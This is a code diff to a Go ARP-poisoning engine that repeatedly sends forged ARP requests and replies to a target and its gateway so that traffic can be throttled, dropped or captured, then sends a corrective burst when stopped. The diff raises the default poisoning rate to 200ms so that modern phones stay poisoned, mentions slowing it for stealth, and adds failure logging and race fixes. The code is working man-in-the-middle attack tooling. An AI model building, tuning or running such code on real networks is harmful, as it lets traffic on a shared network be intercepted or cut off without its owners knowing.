@@ -68,7 +68,7 @@ type runner struct {
 	done    chan struct{} // closed when poison goroutine exits
 
 	// Pre-built cadence frames. The 4 frames sent per cycle (REQ+REPLY
-	// to poison the target, REQ+REPLY to poison the gateway) are
+	// to poison the target, REP+REPLY to poison the gateway) are
 	// completely static for the lifetime of this runner — Target MACs
 	// and IPs don't change. Building them once at Start and reusing
 	// them on every tick eliminates 4 SerializeBuffer allocations and
@@ -80,6 +80,13 @@ type runner struct {
 	poisonTargetRep []byte
 	poisonGwReq     []byte
 	poisonGwRep     []byte
+
+	// consecutiveWriteFails counts sequential pcap write failures.
+	// When it crosses a threshold the engine logs a warning — keeps
+	// operators from staring at a TUI that says "THROTTLE" while the
+	// packets never leave the wire.
+	// Accessed atomically: written by loop(), read by WriteFailures().
+	consecutiveWriteFails atomic.Int32
 }
 
 // copyTarget returns a deep copy of t so callers can't mutate engine-internal
@@ -94,19 +101,15 @@ func copyTarget(t Target) Target {
 }
 
 // New returns an engine bound to a specific interface and operator MAC.
-// cadence=0 selects the default of 1 second (1 Hz × 4 frames/cycle =
-// 4 frames/sec/target). Default rationale: the only cadence that
-// empirically keeps the corrective-on-clear path reliable in integration
-// tests — sub-second cadence reinforces the receiver's neighbour entry
-// so often that the corrective burst can't always dislodge it within
-// the test's deadline.
+// cadence=0 selects the default of 200ms (~5 fps × 4 frames/cycle =
+// 20 frames/sec/target). This faster default is needed because modern
+// devices (iOS 16+, Android 12+) refresh ARP entries sub-second when
+// traffic is active. The original 1s default lost the cache race.
 //
-// Operators on networks where the receiver auto-refreshes faster than
-// 1 Hz (modern Android/iOS especially) should crank this down via the
-// daemon's -poison-cadence flag — `200ms` (~20 fps) is usually enough,
-// `50ms` (~80 fps) handles stubborn iOS. Just note that aggressive
-// cadence makes `policy clear` slower because the corrective has to
-// flood harder to win the cache back.
+// Operators on networks where 200ms is too aggressive for stealth can
+// dial up via the daemon's -poison-cadence flag — `500ms` or `1s`.
+// Note that slower cadence makes `policy clear` slower because the
+// corrective has to flood harder to win the cache back.
 //
 // Returns an error if the shared pcap handle can't be opened (most
 // commonly: CAP_NET_RAW missing or iface doesn't exist). Callers should
@@ -114,7 +117,7 @@ func copyTarget(t Target) Target {
 // instead of a silent first-policy-fails-mysteriously later on.
 func New(iface string, opMAC net.HardwareAddr, cadence time.Duration) (*Engine, error) {
 	if cadence == 0 {
-		cadence = time.Second
+		cadence = 200 * time.Millisecond
 	}
 	h, err := pcap.OpenLive(iface, 65536, false, pcap.BlockForever)
 	if err != nil {
@@ -211,7 +214,7 @@ func (e *Engine) Start(t Target) error {
 	}
 	ctx, cancel := context.WithCancel(context.Background())
 	r := &runner{
-		target:          t,
+		target:          copyTarget(t), // deep copy to avoid caller mutation
 		cancel:          cancel,
 		started:         time.Now(),
 		done:            make(chan struct{}),
@@ -221,9 +224,11 @@ func (e *Engine) Start(t Target) error {
 		poisonGwRep:     pGwRep,
 	}
 	e.active[key] = r
-	e.mu.Unlock()
-
+	// Launch goroutine BEFORE releasing the lock to avoid race where
+	// Stop() could delete the entry and cancel before loop() starts.
+	// The goroutine immediately checks ctx.Done() if it was cancelled.
 	go e.loop(ctx, r)
+	e.mu.Unlock()
 	return nil
 }
 
@@ -232,16 +237,36 @@ func (e *Engine) loop(ctx context.Context, r *runner) {
 	tick := time.NewTicker(e.cadence)
 	defer tick.Stop()
 	send := func() {
-		_ = e.write(r.poisonTargetReq)
+		err1 := e.write(r.poisonTargetReq)
 		_ = e.write(r.poisonTargetRep)
 		_ = e.write(r.poisonGwReq)
 		_ = e.write(r.poisonGwRep)
+
+		if err1 != nil {
+			fails := r.consecutiveWriteFails.Add(1)
+			if fails == 1 {
+				log.Printf("arpengine: write failed for target %s (%s → %s): pcap socket may be dead or interface does not support raw frame injection; %d consecutive cycle(s) with write errors — packets are NOT leaving the wire",
+					r.target.MAC, r.target.IP, r.target.GwIP, fails)
+			}
+		} else if r.consecutiveWriteFails.Load() > 0 {
+			log.Printf("arpengine: write recovered for target %s after %d consecutive failure(s)",
+				r.target.MAC, r.consecutiveWriteFails.Load())
+			r.consecutiveWriteFails.Store(0)
+		}
 	}
 
+	// Check if we were cancelled before we even started (race with Stop).
+	if ctx.Err() != nil {
+		return
+	}
 	send() // immediate first emission
 	for {
 		select {
 		case <-ctx.Done():
+			if fails := r.consecutiveWriteFails.Load(); fails > 0 {
+				log.Printf("arpengine: target %s stopped after %d consecutive write failures — poison was not effective",
+					r.target.MAC, fails)
+			}
 			return
 		case <-tick.C:
 			send()
@@ -266,7 +291,9 @@ func (e *Engine) Stop(t Target) error {
 	r.cancel()
 	<-r.done
 
-	return e.sendCorrective(t)
+	// Use a background context for single-target Stop — the caller expects
+	// the corrective to complete. StopAll uses its own context for batch.
+	return e.sendCorrective(context.Background(), t)
 }
 
 // sendCorrective performs the post-stop corrective ARP burst for one
@@ -277,11 +304,18 @@ func (e *Engine) Stop(t Target) error {
 // through handleMu; that's fine because writes are negligible (~tens of
 // microseconds) compared to the locktime sleep (1.1 s) and the inter-
 // burst sleeps (5 × 100 ms).
-func (e *Engine) sendCorrective(t Target) error {
+//
+// The ctx parameter allows cancellation during shutdown — if the daemon
+// receives SIGKILL escalation, we abort gracefully instead of blocking.
+func (e *Engine) sendCorrective(ctx context.Context, t Target) error {
 	// Wait past Linux's neighbour-table locktime (default 1s) so the
 	// receiving kernel won't silently drop our corrective frames as a
 	// race with the just-completed poison send.
-	time.Sleep(1100 * time.Millisecond)
+	select {
+	case <-ctx.Done():
+		return ctx.Err()
+	case <-time.After(1100 * time.Millisecond):
+	}
 
 	// Build all six frames once, outside the burst loop.
 	reqGwToTarget, errGT := buildARPRequest(e.opMAC, t.GwMAC, t.GwIP, t.MAC, t.IP)
@@ -290,6 +324,20 @@ func (e *Engine) sendCorrective(t Target) error {
 	repTargetToGw, errTR := buildARPReply(e.opMAC, t.MAC, t.IP, t.GwMAC, t.GwIP)
 	garpGw, errG1 := buildGratuitousARP(e.opMAC, t.GwMAC, t.GwIP)
 	garpTarget, errG2 := buildGratuitousARP(e.opMAC, t.MAC, t.IP)
+
+	// Log frame build failures. These indicate malformed MAC/IP inputs —
+	// should be rare but worth surfacing so operators see why corrective
+	// isn't working. Count only unique error messages to avoid log spam.
+	var buildErrs int
+	for _, err := range []error{errGT, errGR, errTT, errTR, errG1, errG2} {
+		if err != nil {
+			buildErrs++
+		}
+	}
+	if buildErrs > 0 {
+		log.Printf("arpengine: corrective for %s: %d of 6 frames failed to build (malformed MAC/IP?) — corrective will be partial",
+			t.MAC, buildErrs)
+	}
 
 	// 5 cycles × 100 ms = 500 ms of corrective. Each cycle emits the
 	// real (gw, target) mappings as REQUESTs (which always learn sender
@@ -316,13 +364,26 @@ func (e *Engine) sendCorrective(t Target) error {
 		}
 	}
 	for i := 0; i < 5; i++ {
+		select {
+		case <-ctx.Done():
+			if writeErrs > 0 {
+				log.Printf("arpengine: corrective burst for %s interrupted after %d cycles with %d write failures",
+					t.MAC, i, writeErrs)
+			}
+			return ctx.Err()
+		default:
+		}
 		send(reqGwToTarget, errGT)
 		send(repGwToTarget, errGR)
 		send(reqTargetToGw, errTT)
 		send(repTargetToGw, errTR)
 		send(garpGw, errG1)
 		send(garpTarget, errG2)
-		time.Sleep(100 * time.Millisecond)
+		select {
+		case <-ctx.Done():
+			return ctx.Err()
+		case <-time.After(100 * time.Millisecond):
+		}
 	}
 	if writeErrs > 0 {
 		log.Printf("arpengine: corrective burst for %s had %d write failures (last: %v) — target may stay poisoned until its ARP cache expires",
@@ -340,6 +401,12 @@ func (e *Engine) sendCorrective(t Target) error {
 // SIGTERM grace window before SIGKILL. Sequential cleanup of 4+ active
 // poisons would blow that budget and leave real victims poisoned.
 func (e *Engine) StopAll() error {
+	return e.StopAllWithContext(context.Background())
+}
+
+// StopAllWithContext is StopAll with an explicit context for cancellation.
+// Used by the daemon to abort corrective bursts if SIGKILL escalates.
+func (e *Engine) StopAllWithContext(ctx context.Context) error {
 	e.mu.Lock()
 	runners := make([]*runner, 0, len(e.active))
 	targets := make([]Target, 0, len(e.active))
@@ -350,8 +417,11 @@ func (e *Engine) StopAll() error {
 	}
 	e.mu.Unlock()
 
+	// Cancel all contexts first (cheap), then wait for all done channels.
 	for _, r := range runners {
 		r.cancel()
+	}
+	for _, r := range runners {
 		<-r.done
 	}
 
@@ -362,7 +432,7 @@ func (e *Engine) StopAll() error {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
-			errs[i] = e.sendCorrective(t)
+			errs[i] = e.sendCorrective(ctx, t)
 		}()
 	}
 	wg.Wait()
@@ -385,4 +455,20 @@ func (e *Engine) Active() []ActivePoison {
 		out = append(out, ActivePoison{Target: copyTarget(r.target), Started: r.started})
 	}
 	return out
+}
+
+// WriteFailures returns the total number of targets currently experiencing
+// consecutive pcap write failures. A count > 0 with poisons active means
+// ARP frames are not leaving the wire — throttle/drop/pcap policies are
+// installed but the targets never see the poison.
+func (e *Engine) WriteFailures() int {
+	e.mu.Lock()
+	defer e.mu.Unlock()
+	n := 0
+	for _, r := range e.active {
+		if r.consecutiveWriteFails.Load() > 0 {
+			n++
+		}
+	}
+	return n
 }
